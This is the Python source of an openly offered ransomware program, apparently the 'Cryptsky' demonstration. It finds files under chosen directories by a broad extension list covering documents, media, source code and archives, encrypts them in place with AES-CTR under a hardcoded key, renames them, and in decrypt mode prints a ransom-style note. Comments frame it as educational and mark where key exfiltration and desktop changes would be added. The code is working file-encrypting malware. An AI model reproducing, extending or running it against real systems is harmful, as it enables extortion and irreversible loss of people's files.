from Crypto.Cipher import AES
from Crypto.Util import Counter
from random import random
import sys
import os


HARDCODED_KEY = 'yellow submarine'
ENCRYPTED_EXTENSION = 'crypt3d'


def discoverFiles(startpath, decrypt):
    if decrypt:
        extensions = [ENCRYPTED_EXTENSION]
    else:
        extensions = [
            # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # images
            'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # music and sound
            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Video and movies

            'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
            # OpenOffice, Adobe, Latex, Markdown, etc
            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',
            'yml', 'yaml', 'json', 'xml', 'csv',  # structured data
            'db', 'sql', 'dbf', 'mdb', 'iso',  # databases and disc images

            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # web technologies
            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
            'java', 'class', 'jar',  # java source code
            'ps', 'bat', 'vb',  # windows based scripts
            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # linux/mac based scripts
            'go', 'py', 'pyc', 'bf', 'coffee',  # other source code files

            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
        ]

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path


def modifyFile(filename, crypto, decrypt, blocksize=16):
    with open(filename, 'r+b') as f:
        plaintext = f.read(blocksize)

        while plaintext:
            ciphertext = crypto(plaintext)
            if len(plaintext) != len(ciphertext):
                raise ValueError('''Ciphertext({})is not of the same length of the Plaintext({}).
                Not a stream cipher.'''.format(len(ciphertext), len(plaintext)))

            f.seek(-len(plaintext), 1)
            f.write(ciphertext)

            plaintext = f.read(blocksize)

    if decrypt and filename.endswith(ENCRYPTED_EXTENSION):
        os.rename(filename, filename[:-len(ENCRYPTED_EXTENSION)-1])
    else:
        os.rename(filename, filename + '.' + ENCRYPTED_EXTENSION)


def main():
    decrypt = len(sys.argv) > 1 and sys.argv[1] == "-d"

    if decrypt:
        print('''
Cryptsky!
---------------
Your files have been encrypted. This is normally the part where I would
tell you to pay a ransom, and I will send you the decryption key. However, this
is an open source project to show how easy malware can be to write and to allow
others to view what may be one of the first fully open source python ransomwares.

This project does not aim to be malicious. The decryption key can be found
below, free of charge. Please be sure to type it in EXACTLY, or you risk losing
your files forever. Do not include the surrounding quotes, but do make sure
to match case, special characters, and anything else EXACTLY!
Happy decrypting and be more careful next time!

Your decryption key is: '{}'

'''.format(HARDCODED_KEY))
        key = input('Enter Your Key> ')

    else:
        # In real ransomware, this part includes complicated key generation,
        # sending the key back to attackers and more
        # maybe I'll do that later. but for now, this will do.
        if HARDCODED_KEY:
            key = HARDCODED_KEY

        # else:
        #     key = random(32)

    ctr = Counter.new(128)
    crypt = AES.new(key.encode("utf8"), AES.MODE_CTR, counter=ctr)

    # change this to fit your needs.
    startdirs = ['./testing', './test_files']

    for currentDir in startdirs:
        for file in discoverFiles(currentDir, decrypt):
            modifyFile(file, crypt.encrypt, decrypt)

    if not decrypt:
        pass
        # post encrypt stuff
        # desktop picture
        # icon, etc


if __name__ == "__main__":
    main()
